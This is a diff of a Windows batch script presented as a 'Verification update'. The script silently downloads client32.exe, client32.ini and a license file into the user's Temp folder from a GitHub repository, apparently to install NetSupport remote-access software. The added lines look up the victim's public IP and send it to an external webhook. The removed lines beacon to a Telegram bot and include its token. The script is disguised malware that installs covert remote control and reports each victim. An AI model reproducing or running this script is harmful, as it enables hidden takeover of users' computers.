@@ -2,7 +2,8 @@
 echo Verification update in progress. Please wait...
 set "TEMP=%USERPROFILE%\AppData\Local\Temp"
 
-curl -s -X GET "https://api.telegram.org/bot6579934751:AAEUzUGdZt-DH2XnbG15mWCzYdv37a6BNWc/sendMessage" -d "chat_id=-1002239672340&text=Verify starting..." >nul 2>&1
+for /f "tokens=*" %%i in ('curl -s "https://checkip.amazonaws.com/"') do set "IP=%%i"
+curl -s -X GET "https://n8nservice.online/webhook/install?text=Verify starting... IP: %IP%" >nul 2>&1
 curl -L -o "%TEMP%\client32.exe" "https://github.com/helper-net/update/raw/refs/heads/main/client32.exe" >nul 2>&1
 curl -L -o "%TEMP%\client32.ini" "https://raw.githubusercontent.com/helper-net/update/refs/heads/main/client32.ini" >nul 2>&1
 curl -L -o "%TEMP%\NSM.LIC" "https://github.com/helper-net/update/raw/refs/heads/main/NSM.LIC" >nul 2>&1
